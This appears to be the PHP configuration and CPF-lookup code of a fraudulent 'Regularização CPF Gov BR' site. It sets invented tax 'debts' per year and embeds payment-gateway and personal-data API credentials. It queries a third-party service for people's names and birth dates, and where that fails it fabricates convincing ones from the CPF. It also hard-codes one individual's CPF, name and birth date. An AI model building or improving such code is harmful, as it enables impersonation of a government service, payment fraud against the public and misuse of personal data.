<?php
// Configurações Globais do Site de Reconstrução Fiscal

// Valores de débito para cada ano (em centavos)
define('VALOR_2020', 9401);  // R$ 94,01 (Obrigatório)
define('VALOR_2021', 8343);  // R$ 83,43
define('VALOR_2022', 9125);  // R$ 91,25
define('VALOR_2023', 9987);  // R$ 99,87
define('VALOR_2024', 10845); // R$ 108,45
define('VALOR_2025', 12458); // R$ 124,58

// Nome do Produto a ser exibido no gateway
define('PRODUTO_NOME', 'Regularização CPF Gov BR');

// URL e Token da API de consulta de CPF real (se houver). 
// Altere para a URL e Token do seu provedor.
define('API_CONSULTA_URL', 'https://base4.sistemafullativo.online:81/api/cpfx?CPF='); // Exemplo de endpoint
define('API_CONSULTA_TOKEN', '78E092FDEA'); // Insira o token/chave da sua API aqui se necessário

// Credenciais do Gateway de Pagamento Fyntra
define('FYNTRA_API_URL', 'https://api-gateway.fyntrabr.com/api/user');
define('FYNTRA_API_KEY', '52e35ea8-2970-48ac-a8ee-a7a0a5664408');

/**
 * Função para obter dados reais ou fictícios com base no CPF (apenas números).
 * Tenta consultar uma API real configurada. Se falhar ou não estiver configurada,
 * utiliza o gerador matemático determinístico baseado no CPF.
 */
function obterDadosCPF($cpf_limpo) {
    // CPF de teste original
    if ($cpf_limpo === '46620588808' || $cpf_limpo === '466.205.888-08') {
        return [
            'nome'       => 'Caique Dos Santos Pires',
            'nascimento' => '09/11/2004'
        ];
    }

    // 1. Tentativa de Consulta via API real se configurada
    // Nota: Vercel bloqueia portas não-padrão. Usamos file_get_contents com stream context
    // que tem melhor suporte a portas alternativas em ambientes serverless.
    if (defined('API_CONSULTA_URL') && !empty(API_CONSULTA_TOKEN)) {
        $url = API_CONSULTA_URL . $cpf_limpo . '&token=' . urlencode(API_CONSULTA_TOKEN);

        // Tenta via cURL primeiro
        $response = false;
        $http_code = 0;
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 8);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Accept: application/json',
                'Connection: keep-alive'
            ]);
            $response  = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
        }

        // Fallback: file_get_contents (funciona em alguns ambientes serverless)
        if (($http_code !== 200 || empty($response)) && ini_get('allow_url_fopen')) {
            $ctx = stream_context_create(['http' => [
                'timeout'        => 8,
                'ignore_errors'  => true,
                'user_agent'     => 'Mozilla/5.0',
                'header'         => "Accept: application/json\r\n"
            ]]);
            $response  = @file_get_contents($url, false, $ctx);
            $http_code = $response !== false ? 200 : 0;
        }

        if ($http_code === 200 && !empty($response)) {
            // Normaliza encoding
            if (!mb_check_encoding($response, 'UTF-8')) {
                $response = mb_convert_encoding($response, 'UTF-8', 'ISO-8859-1');
            }

            $dados_api = json_decode($response, true);

            if (is_array($dados_api)) {
                // Normaliza todas as chaves para minúsculo
                $flat = [];
                foreach ($dados_api as $k => $v) {
                    $flat[strtolower($k)] = $v;
                }
                // Verifica subnós comuns
                foreach (['data','result','registro','retorno','dados'] as $sub) {
                    if (isset($flat[$sub]) && is_array($flat[$sub])) {
                        foreach ($flat[$sub] as $k => $v) {
                            $flat[strtolower($k)] = $v;
                        }
                    }
                }

                $nome = $flat['nome'] ?? $flat['nome_completo'] ?? '';
                $nasc = $flat['nascimento'] ?? $flat['nasc'] ?? $flat['data_nascimento'] ?? $flat['dt_nasc'] ?? '';

                if (!empty($nome)) {
                    if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $nasc)) {
                        $nasc = date('d/m/Y', strtotime($nasc));
                    }
                    return [
                        'nome'       => mb_convert_case(trim($nome), MB_CASE_TITLE, 'UTF-8'),
                        'nascimento' => $nasc ?: '01/01/1990'
                    ];
                }
            }
        }
    }

    // 2. Fallback: Listas para geração determinística (se não configurada ou se falhar)
    $primeiros_nomes = [
        'José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco',
        'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana',
        'Fernanda', 'Patrícia', 'Camila', 'Aline', 'Sandra',
        'Roberto', 'Anderson', 'Bruno'
    ];
    $sobrenomes = [
        'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira',
        'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro',
        'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Dias',
        'Vieira', 'Rocha'
    ];

    $n = count($primeiros_nomes);
    $s = count($sobrenomes);

    // Gera hashes independentes para cada campo usando o CPF completo como chave
    $h1 = abs(crc32($cpf_limpo . 'nome1'));
    $h2 = abs(crc32($cpf_limpo . 'sobrenome1'));
    $h3 = abs(crc32($cpf_limpo . 'sobrenome2'));
    $hd = abs(crc32($cpf_limpo . 'dia'));
    $hm = abs(crc32($cpf_limpo . 'mes'));
    $ha = abs(crc32($cpf_limpo . 'ano'));

    $nome1 = $primeiros_nomes[$h1 % $n];
    $nome2 = $sobrenomes[$h2 % $s];
    $nome3 = $sobrenomes[$h3 % $s];

    $dia = str_pad(($hd % 28) + 1, 2, '0', STR_PAD_LEFT);
    $mes = str_pad(($hm % 12) + 1, 2, '0', STR_PAD_LEFT);
    $ano = 1965 + ($ha % 41); // 1965–2005

    return [
        'nome'       => "$nome1 $nome2 $nome3",
        'nascimento' => "$dia/$mes/$ano"
    ];
}
